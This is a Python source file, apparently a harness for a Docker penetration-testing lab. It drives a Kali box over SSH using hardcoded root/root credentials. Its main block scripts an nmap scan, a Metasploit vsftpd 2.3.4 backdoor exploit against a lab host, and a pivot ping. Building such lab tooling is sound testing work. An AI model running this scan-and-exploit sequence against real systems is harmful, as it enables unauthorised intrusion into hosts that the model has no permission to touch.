import paramiko
import time
import sys
import re
import logging

def _remove_ansi_escape_codes(text):
    ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
    return ansi_escape.sub('', text)

class Remote:
    def __init__(self, ssh_config, timeout=8, verbose=False, log=False):
        self.ssh_config = ssh_config
        self.ip = ssh_config["hostname"]
        self.timeout = timeout
        self.channel = None
        self.verbose = verbose
        if log:
            logging.basicConfig(filename=f"pwn_{time.strftime('%Y%m%d_%H%M%S')}.log", level=logging.INFO, format="%(message)s")


    def reset(self):
        """Reset SSH Connection."""
        print("Environment reset.", file=sys.stdout)  # Wait for containers to be fully up and SSH ready
        self._setup_ssh_connection()

    def step(self, command, no_op=False, timeout=None, log=False): # need to include logic to re-init connection if dropped
        """Execute an interactive command on the SSH client."""
    
        # Clearing any welcome messages or prompts
        if timeout is None:
            timeout = self.timeout

        if type(command) == str:
            command += "\n"
        # Sending the command
        if not no_op:
            while self.channel.recv_ready():
                self.channel.recv(1024)
            self.channel.send(command)

        output = []
        last_received = time.time()

        # Collect output until the timeout expires after the last data received
        while True:
            if self.channel.recv_ready():
                data = self.channel.recv(1024).decode('utf-8')
                output.append(data)
                last_received = time.time()

            # Break if the current time is greater than last received data plus timeout
            if time.time() > last_received + timeout:
                break
            
        response = ''.join(output)
        response = response.replace('\r', '').strip()
        if self.verbose:
            print("CHANNEL:", self.channel.active)
            print("INPUT:", file=sys.stdout)
            print(command, file=sys.stdout)
            print("END INPUT", file=sys.stdout)
            print("RESPONSE:", file=sys.stdout)
            print(response, file=sys.stdout)
            print("END RESPONSE", file=sys.stdout)
        response = _remove_ansi_escape_codes(response)
        if log:
            logging.info(command)
            logging.info(response)
        return response

    def _setup_ssh_connection(self):
        """Establishes an initial SSH connection to the backend."""
        ### Setup Kali SSH client connection
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(**self.ssh_config)
        self.channel = ssh_client.invoke_shell()
        self.step("", no_op=True)

    def shutdown(self):
        """Shuts down the Docker environment."""
        if self.channel:
            self.channel.close()
        print("Connection Closed.", file=sys.stdout)


if __name__ == "__main__":
    ssh_info = {
        'hostname': '192.168.100.5',
        'port': 22,  # Adjust as necessary
        'username': 'root',
        'password': 'root',
    }

    from backends import DockerBackend
    backend = DockerBackend('./docker/docker-compose-debug.yml')
    backend.stop()
    backend.start()
    env = Remote(ssh_info)
    env.reset()
    
    try:
        output = env.step('nmap -sV 192.168.100.6')
        print("Command output:", output)

        # Example command execution
        output = env.step('msfconsole -q')
        print("Command output:", output)

        # Interact with an interactive tool
        output = env.step('use exploit exploit/unix/ftp/vsftpd_234_backdoor')
        print("Command output:", output)

        output = env.step('set RHOSTS 192.168.100.6')
        print("Command output:", output)

        output = env.step('set RPORT 21')
        print("Command output:", output)

        output = env.step('exploit')
        print("Command output:", output)

        if "no session" in output:
            output = env.step('exploit')
            print("Reattempting exploit:", output)

        output = env.step('ifconfig')
        print("Command output:", output)

        # testing pivot env visibility
        output = env.step('ping -c 4 172.20.0.7')
        print("Command output:", output)
        
    finally:
        # Close the client to free resources
        env.shutdown()
        backend.stop()
